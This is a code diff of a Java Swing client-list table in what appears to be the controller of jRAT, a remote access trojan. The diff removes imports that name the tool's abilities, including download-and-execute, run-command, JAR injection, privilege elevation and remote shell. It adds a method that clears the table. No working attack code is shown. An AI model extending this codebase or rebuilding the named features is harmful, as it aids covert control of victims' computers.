@@ -8,69 +8,31 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.MouseAdapter;
 import java.awt.event.MouseEvent;
-import java.io.File;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
 
 import javax.swing.JCheckBox;
 import javax.swing.JCheckBoxMenuItem;
-import javax.swing.JFileChooser;
 import javax.swing.JLabel;
 import javax.swing.JMenu;
 import javax.swing.JMenuItem;
-import javax.swing.JOptionPane;
-import javax.swing.JPopupMenu;
 import javax.swing.JTable;
 import javax.swing.ListSelectionModel;
-import javax.swing.event.PopupMenuEvent;
-import javax.swing.event.PopupMenuListener;
 
-import jrat.api.Client;
-import jrat.api.ui.RATMenuItem;
-import se.jrat.common.downloadable.Downloadable;
 import se.jrat.common.utils.DataUnits;
 import se.jrat.controller.AbstractSlave;
 import se.jrat.controller.Main;
 import se.jrat.controller.Slave;
 import se.jrat.controller.Status;
-import se.jrat.controller.addons.ClientFormat;
-import se.jrat.controller.listeners.CountryMenuItemListener;
-import se.jrat.controller.net.URLParser;
-import se.jrat.controller.packets.outgoing.Packet100RequestElevation;
-import se.jrat.controller.packets.outgoing.Packet11Disconnect;
-import se.jrat.controller.packets.outgoing.Packet14VisitURL;
-import se.jrat.controller.packets.outgoing.Packet17DownloadExecute;
-import se.jrat.controller.packets.outgoing.Packet18Update;
-import se.jrat.controller.packets.outgoing.Packet36Uninstall;
-import se.jrat.controller.packets.outgoing.Packet37RestartJavaProcess;
-import se.jrat.controller.packets.outgoing.Packet38RunCommand;
-import se.jrat.controller.packets.outgoing.Packet42ServerUploadFile;
-import se.jrat.controller.packets.outgoing.Packet45Reconnect;
-import se.jrat.controller.packets.outgoing.Packet98InjectJAR;
 import se.jrat.controller.settings.Settings;
 import se.jrat.controller.settings.SettingsColumns;
-import se.jrat.controller.threads.UploadThread;
 import se.jrat.controller.ui.Columns;
 import se.jrat.controller.ui.components.DefaultJTable;
 import se.jrat.controller.ui.components.TableModel;
-import se.jrat.controller.ui.dialogs.DialogFileType;
-import se.jrat.controller.ui.frames.FrameControlPanel;
-import se.jrat.controller.ui.frames.FrameNotes;
-import se.jrat.controller.ui.frames.FrameRemoteChat;
-import se.jrat.controller.ui.frames.FrameRemoteFiles;
-import se.jrat.controller.ui.frames.FrameRemoteProcess;
-import se.jrat.controller.ui.frames.FrameRemoteRegistry;
-import se.jrat.controller.ui.frames.FrameRemoteScreen;
-import se.jrat.controller.ui.frames.FrameRemoteShell;
-import se.jrat.controller.ui.frames.FrameRename;
-import se.jrat.controller.ui.frames.FrameSystemInfo;
 import se.jrat.controller.ui.renderers.table.DefaultJTableCellRenderer;
 import se.jrat.controller.utils.BasicIconUtils;
-import se.jrat.controller.utils.NetUtils;
 import se.jrat.controller.utils.Utils;
-
-import com.redpois0n.oslib.OperatingSystem;
 
 @SuppressWarnings("serial")
 public class PanelMainClientsTable extends PanelMainClients {
@@ -178,6 +140,13 @@ public class PanelMainClientsTable extends PanelMainClients {
 	public AbstractSlave getSelectedSlave() {
 		int row = table.getSelectedRow();
 		return getSlave(row);
+	}
+	
+	@Override
+	public void clear() {
+		while (model.getRowCount() > 0) {
+			model.removeRow(0);
+		}
 	}
 	
 	public void setRowHeight(int i) {
